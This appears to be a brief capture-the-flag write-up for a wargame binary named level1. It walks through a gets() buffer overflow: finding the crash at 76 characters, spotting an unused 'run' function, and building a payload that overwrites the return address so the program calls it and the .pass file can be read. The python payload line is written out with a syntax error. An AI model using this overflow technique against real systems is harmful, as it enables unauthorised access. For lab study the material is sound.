First thing first is to gdb the binary

disas the main

lets check vulnerabilities of gets function
--> buffer overflow exploit

lets try when the program crash sending longer and longer strings
--> 76 chars it crash "Illegal instruction"

By doing info functions we can see every functions used in the binary, we can see a run func lets disas it
[...]
run
[...]

Using cutter, we can see that run is a build in function that has been import but never used, so lets try to exploit the buffer overflow to call it.

lets craft the payload

python -c '"a" * 76 + \x80\x83\x04\x08' > /tmp/payload

And use it 

cat /tmp/payload - | ./level1

gg now you can cat the .pass
